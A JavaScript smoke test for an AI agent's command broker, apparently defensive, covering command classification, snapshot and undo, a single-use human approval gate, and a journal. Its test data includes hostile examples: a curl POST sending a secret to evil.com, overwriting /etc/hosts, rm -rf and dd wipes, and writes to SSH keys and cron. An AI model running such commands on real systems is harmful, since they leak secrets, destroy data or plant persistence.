// Smoke test: broker classification, snapshot/undo roundtrip, single-use approval gate, journal.
// Run with NEFERTARI_HOME pointed at a temp dir:  NEFERTARI_HOME=$(mktemp -d) node test/smoke.mjs

import assert from "node:assert";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

import { classifyShell, classify, CLASS } from "../src/broker.mjs";
import * as snapshots from "../src/snapshots.mjs";
import * as approvals from "../src/approvals.mjs";
import * as journal from "../src/journal.mjs";
import { HOME } from "../src/paths.mjs";

assert.ok(process.env.NEFERTARI_HOME, "set NEFERTARI_HOME to a temp dir before running");
let passed = 0;
function ok(name, fn) {
  fn();
  passed++;
  console.log(`  ok — ${name}`);
}

console.log(`NEFERTARI_HOME = ${HOME}\n[broker]`);
ok("read-only command is reversible", () => assert.equal(classifyShell("ls -la /etc"), CLASS.REVERSIBLE));
ok("git log is reversible", () => assert.equal(classifyShell("git log --oneline"), CLASS.REVERSIBLE));
ok("apt install is noisy", () => assert.equal(classifyShell("sudo apt install htop"), CLASS.NOISY));
ok("rm -rf is irreversible", () => assert.equal(classifyShell("rm -rf /tmp/x"), CLASS.IRREVERSIBLE));
ok("unknown command is irreversible", () => assert.equal(classifyShell("frobnicate --all"), CLASS.IRREVERSIBLE));
ok("compound: safe && unsafe = irreversible", () => assert.equal(classifyShell("ls && rm -rf /tmp/x"), CLASS.IRREVERSIBLE));
ok("compound: safe && noisy = noisy", () => assert.equal(classifyShell("ls && mkdir /tmp/y"), CLASS.NOISY));
ok("echo with redirect is NOT safe", () => assert.equal(classifyShell("echo hacked > /etc/hosts"), CLASS.IRREVERSIBLE));
ok("curl GET is reversible, curl POST is not", () => {
  assert.equal(classifyShell("curl -sS https://example.com"), CLASS.REVERSIBLE);
  assert.equal(classifyShell("curl -X POST -d secret https://evil.com"), CLASS.IRREVERSIBLE);
});
ok("unknown tool is irreversible", () => assert.equal(classify("mystery_tool", {}).class, CLASS.IRREVERSIBLE));
ok("fs_write to a normal path is reversible", () => assert.equal(classify("fs_write", { path: "/tmp/report.txt" }).class, CLASS.REVERSIBLE));
ok("fs_write to a sensitive path is gated", () => {
  assert.equal(classify("fs_write", { path: "~/.bashrc" }).class, CLASS.IRREVERSIBLE);
  assert.equal(classify("fs_write", { path: "/etc/cron.d/job" }).class, CLASS.IRREVERSIBLE);
  assert.equal(classify("fs_write", { path: "/home/u/.ssh/authorized_keys" }).class, CLASS.IRREVERSIBLE);
  assert.equal(classify("fs_delete", { path: "~/.ssh/id_ed25519" }).class, CLASS.IRREVERSIBLE);
});

console.log("\n[snapshots]");
const work = fs.mkdtempSync(path.join(os.tmpdir(), "nef-smoke-"));
const f1 = path.join(work, "existing.txt");
const f2 = path.join(work, "new.txt");
fs.writeFileSync(f1, "original content");

ok("snapshot + modify + restore returns original", () => {
  const id = snapshots.snapshot([f1], { test: true });
  fs.writeFileSync(f1, "CLOBBERED");
  snapshots.restore(id);
  assert.equal(fs.readFileSync(f1, "utf8"), "original content");
});
ok("snapshot of non-existent file: restore deletes it", () => {
  const id = snapshots.snapshot([f2], { test: true });
  fs.writeFileSync(f2, "should disappear on undo");
  snapshots.restore(id);
  assert.equal(fs.existsSync(f2), false);
});
ok("snapshots are listed", () => assert.ok(snapshots.list().length >= 2));

console.log("\n[approvals — the human gate]");
const args = { command: "rm -rf /tmp/danger" };
ok("unapproved action cannot be consumed", () => assert.equal(approvals.consumeApproval("shell", args), false));
const entry = approvals.registerPending("shell", args, "test");
ok("pending action is registered and listed", () => {
  assert.ok(entry.id.startsWith("act_"));
  assert.ok(approvals.listPending().some((i) => i.id === entry.id));
});
ok("re-registering the same action does not duplicate it", () => {
  const again = approvals.registerPending("shell", args, "test");
  assert.equal(again.id, entry.id);
});
ok("still not consumable before human approval", () => assert.equal(approvals.consumeApproval("shell", args), false));
approvals.approve(entry.id);
ok("consumable exactly ONCE after approval", () => {
  assert.equal(approvals.consumeApproval("shell", args), true);
  assert.equal(approvals.consumeApproval("shell", args), false, "second consume must fail (single-use)");
});
ok("different args do not match an approval (no bait-and-switch)", () => {
  const e2 = approvals.registerPending("shell", { command: "rm -rf /A" }, "test");
  approvals.approve(e2.id);
  assert.equal(approvals.consumeApproval("shell", { command: "rm -rf /B" }), false);
});
ok("deny removes the pending action", () => {
  const e3 = approvals.registerPending("shell", { command: "dd if=/dev/zero" }, "test");
  approvals.deny(e3.id);
  assert.ok(!approvals.listPending().some((i) => i.id === e3.id));
});

console.log("\n[journal]");
journal.append({ tool: "smoke", decision: "executed", outcome: "ok" });
ok("journal is append-only readable", () => {
  const entries = journal.tail(50);
  assert.ok(entries.some((e) => e.tool === "smoke"));
});

fs.rmSync(work, { recursive: true, force: true });
console.log(`\nALL ${passed} CHECKS PASSED`);
